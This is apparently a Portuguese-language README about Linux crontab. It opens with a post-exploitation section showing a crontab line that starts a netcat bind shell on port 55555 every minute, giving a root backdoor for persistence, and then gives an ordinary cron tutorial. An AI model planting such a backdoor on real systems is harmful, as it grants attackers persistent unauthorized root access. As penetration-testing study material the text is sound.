# CRONOTAB https://github.com/LelioCosta/Cron 
processo de pós-exploração é inserir algum backdoor - . Uma das formas em ambientes Linux é agendando através o CronTab.

bind shell linux: crontab 
***** rm -f /tmp/f; mkfifo / tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -1 0.0.0.0 55555 > /tmp/f    

Uma outra coisa interessante de fazer em processo de pós-exploração é inserir algum backdoor, alguma forma de termos uma persistência de acesso ao host. Em determinadas situações podemos perder a conexão por qualquer que seja o motivo, seja desde um tratamento de acidente ou seja de fato um problema de rede. E temos que ter uma forma de retomar esse acesso. Uma das formas em ambientes Linux é agendando através o CronTab.
Então como temos o usuário de root, temos acesso a todas as opções, crontab -e, que é para editar o Crontab, já abrimos na forma de edição. Vamos inserir esse comando. Então o que vai acontecer? Ele vai abrir, lembra que ele tem o binário do netcat, verificamos dentro da ferramenta LinPEAS, que tem essa possibilidade, ele vai ouvir em todas as interfaces na porta 555555 e vai realizar um bind shell nessa porta, ele vai executar a todo minuto isso. Então vamos salvar.
Vamos verificar se ele está em execução. Está ouvindo na porta 80, na porta 22, ainda não. Agora sim, perceba que ele está ouvindo na porta 55555. Então, mesmo que perdermos essa conexão, podemos nos conectar novamente porque temos um shell de root. Da mesma forma, podemos melhorar esse shell. Nesse caso, não deu certo, teria que fazer um outro processo, talvez com o Python. Mas o interessante nesse caso é que temos uma persistência, que ainda que perdermos a conexão ou por algum motivo, aquele primeiro shell que obtivemos, perdermos essa conexão, conseguimos reestabelecer através desse bind shell.


Entendendo o Crontab - Agendamento de tarefas em Linux

O Cron é utilizado para agendar tarefas recorrentes, as tarefas são chamadas de cronjobs e são gerenciadas pelo crontab (tabela do cron).

Esta ferramenta vem instalada em diversas distribuições Linux, mas caso o Cron não esteja instalado na sua máquina é possível instalar através do comando abaixo.


CentOS/RHEL 7/8/5
# yum install cronie

Ubuntu
# apt-get install cron

Para criar uma nova tarefa usamos o comando crontab -e que irá abrir o arquivo do cron para inserir o agendamento para o usuário atual. Podemos também editar o agendamento de um usuário passando o parâmetro -u e o nome do usuário em seguida. Assim como o exemplo:

# crontab -e
# crontab -u usuario -e

Outra possibilidade com o comando crontab é listar os agendamentos. Para isso, usamos o parâmetro -l.

# crontab -l
# crontab -u usuario -l

As tabelas do cron de um usuário ficam armazenadas no diretório /var/spool/cron/crontabs/, os agendamentos globais ficam armazenados no arquivo /etc/crontab.

O crontab possui seis colunas, que correspondem aos minutos, horas, dias, meses, semanas e, por fim, aos comandos que serão executados.

E quais são os valores permitidos para cada coluna?
Minuto: Valores de 0 a 59 ou *
Hora: Valores de 0 a 23 ou *
Dia: Valores de 1 a 31 ou *
Mês: Valores de 1 a 12, jan a dec ou *
Semana: 0 a 6, sun a sat ou * (0 e 7 representa Domingo)
Comando: O comando a ser executado ou script

Algumas observações importantes, caso deseje utilizar o mês e semana através dos seus respectivos nomes, deve respeitar a ortografia da língua inglesa.
O caractere asterisco (*) significa do primeiro ao último.
Para executar um script, é recomendado que seja informado o caminho absoluto do script e não o caminho relativo.

Vamos entender o exemplo abaixo. Para a leitura ficar mais clara, vamos começar da direita para a esquerda.

00 12 * * * touch testecron.txt

Será executado o comando touch no arquivo testecron.txt, todos os dias da semana, para todos os meses, em todos os dias do mês, às 12 horas e 00 minutos.

Podemos passar mais de um valor para especificar um campo. Para isso, podemos separar os valores com vírgula. Para especificar um intervalo, utilizamos o hífen (-) separando o valor inicial e o final.

00,30 * * * 1–5 /usr/script/backup.sh

Este agendamento será executado de segunda à sexta, para todos os meses, em todos os dias do mês, todas as horas, a cada 30 minutos.

Uma outra forma de definir os intervalos, é utilizando “saltos”, da seguinte forma 1–9/2, que é o equivalente “1,3,5,7,9”.

* 8–18/2 * * 1–5 /usr/script/backup.sh

Este agendamento será executado de segunda à sexta, para todos os meses, em todos os dias do mês, às 8h, 10h, 12h, 14h, 16h e 18h.

Controle de usuário
Para permitir que apenas alguns usuários possam editar o crontab, deve ser incluído o nome do usuário no arquivo /etc/cron.allow.

Para bloquear que apenas alguns usuários não possam editar o crontab deve ser incluído o nome do usuário no arquivo /etc/cron.deny.

Regra dos arquivos cron.allow e cron.deny
- Se existir o cron.allow, só os usuários listados no arquivo cron.allow poderão manipular o crontab.
- Se não existir o cron.allow, todos os usuários poderão manipular o crontab, exceto os usuários listados no cron.deny.
- Se não tiver nenhum dos dois arquivos, só o usuário root poderá manipular o crontab.
- Se o usuário estiver listado em ambos os arquivos, o usuário poderá manipular o crontab.

Dica
No crontab é importante que sempre a última linha fique em branco, ao incluir um novo agendamento quebre a linha no final. Isso evita um bug antigo da ferramenta.

Monitoramento
Para monitorar o cron, podemos verificar o /var/log/syslog e filtrar por cron. Vamos refinar este monitoramento redirecionando a saída para um arquivo onde ficará apenas os registros dos agendamentos.

# cat /var/log/syslog | grep CRON >> /tmp/cron.log

Conclusão
O cron é um forte aliado para quem gosta de automatizar tarefas, principalmente se você já tem algum processo que roda através de script ou algum monitoramento que você deseja fazer. Existem diversas ferramentas hoje que fazem automação de processos, mas é sempre bom entendermos como podemos fazer estas “automações” sem depender de muitos serviços. Essa compreensão facilita no momento em que estamos estudando novas tecnologias e possibilita fazer associações mais claras e próximas da realidade.

============================================================================================================================================================================================================================================================================

O que é o crontab
Traduzido do inglês-O utilitário de software cron é um agendador de tarefas baseado em tempo em sistemas operacionais de computador tipo Unix. Os usuários que configuram e mantêm ambientes de software usam o cron para agendar tarefas para serem executadas periodicamente em horários, datas ou intervalos fixos.

A maioria das distrubuições Linux já vem com o cron instalado e conficurado para verificar se o cron já está funcionando é só rodar o comando.

Verificar status do cron
sudo /etc/init.d/cron  status

Parar serviço do cron
sudo /etc/init.d/cron stop

Iniciar o serviço do cron
sudo /etc/init.d/cron start

Como funciona a inserção de agendamentos
Para acessar o arquivo com os agendamentos é só rodar o comando

vim /etc/crontab

Parametros de agendamento
Minute (0 - 59)
Hour (0 - 23)
Day of month (1 - 31)
Month (1 - 12) OR jan,feb,mar,apr (abreviação das das primeiras letras da palavra em ingles)
Day of week (0 - 6) (Sunday=0 or 7) OR sun,mon-tue,wed,thu,fri,sat
Extrutura de uma agendamento
Minute - Hour - Day of month - Month - Day of Week - user name - command to de executed

Caso deseje que seja executado em todo intervalo de tempo é só utilizar um (*)

Exemplo caso deseje rodar um comando a cada 1 minuto

* * * * * root /comando

Todos os minutos
Todas as horas
Todos os dias do mes
Todos os meses
Todos os dias sa semana
Observação
Quando desejamos criar um comando para nosso porprio usuario é só usar o comando viw /etc/crontab mas caso deseje agendar o comando em outro usuario é só entrar com o outro usuario e acessar o terminal da mesma forma, ou usar o comando crontab -u username -e (edit)

Agendamento teste
Para editar o crontab e cadastrar um novo agendamento é só usar o comando
crontab -e
Assim que abrir o arquino na ultima linha de baixo você vai colocar o seguinte comando
 * * * * echo "Rodando" >> /home/username/cron.log

Todo minuto
Toda hora
Toda dia do mes
Todos os meses do ano
Todos os dias da semana
Inserir no arquivo cron.log a palavra Rodando
🎉 Pronto o primeiro crontab foi cadastrado, agora é só verificar sa sua area de trabalho que já possui um arquivo com o texto rodando, e se atualizar a pagina a cada um minuto uma nova palavra foi inserida.

Observação
Para mostrar o conteudo do arquivo é só usar o comando cat nomearquivo.ext

Observação
Para mostrar o conteúdo que tem dentro do crontab sem acessar o modo de edição é só executar o comando
 crontab -l (listra)

Exemplo 2 intervalo de 15/15 minutos
0,15,30,45 * * * *  comando

Minuto 0,15,30,45
Todas as horas
Todas os dias do mes
Todos os meses do ano
Todos os dias da semana
Exemplo 3 Feliz natal
Agendar um cron para deseja feliz natal

0 0 25 12 * echo "Feliz natal"

Minuto zero
Hora zero
Dia 25
Mes 12
Qualquer dia da semana
Exemplo 4 Bom trabalho durante o expediente
0 08-12,13-18 * * 1-5

Observação
Para representar um intervalo utiliza o (-)Meio traço isso indica de até, por exemplo 08-12 significa das 8 horas as 12 horas equivale ao mesmo que 08,09,10,11,12, e o (,) Virgula significa um agrupamento por exeplo 08-12,13-14 significa das 8 horas até as 12 horas & das 13 horas até as 14 horas

Sempe no minuto zero
Das 8 horas até as 12 horas, das 13 horas até as 18 horas
Todos os dias dos meses
Todos os meses do ano
De segunda a sexta

==============================================================================================================================================================================================================================================================================

